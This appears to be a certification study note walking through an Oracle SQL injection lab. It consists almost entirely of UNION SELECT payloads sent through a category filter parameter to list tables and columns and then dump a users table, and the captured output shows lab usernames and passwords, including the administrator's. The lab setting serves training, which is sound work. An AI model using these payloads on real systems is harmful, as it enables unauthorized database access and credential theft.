# SQL Injection Labs for the BSCP


## SQL injection attack, listing the database contents on Oracle

Note: Oracle requires a `FROM` clause in all `SELECT` statements. We can use the 
built-in `dual` table for that.

```
GET /filter?category='+UNION+SELECT+NULL,'a'+from+dual-- HTTP/2

GET /filter?category='+UNION+SELECT+NULL,table_name+FROM+all_tables-- HTTP/2
<tr>
  <td>USERS_KMHLSB</td>
</tr>

GET /filter?category='+UNION+SELECT+NULL,column_name+FROM+all_tab_columns+WHERE+table_name+=+'USERS_KMHLSB'-- HTTP/2
PASSWORD_TLPSHT
USERNAME_ZZFDXD


GET /filter?category='+UNION+SELECT+NULL,PASSWORD_TLPSHT+||+':'+||+USERNAME_ZZFDXD+FROM+USERS_KMHLSB-- HTTP/2
93w4qoy3clpolrawivuk:wiener
weq2qre17hvdxek7a4sv:carlos
zu913q61aqwqtdyrv2xo:administrator
```

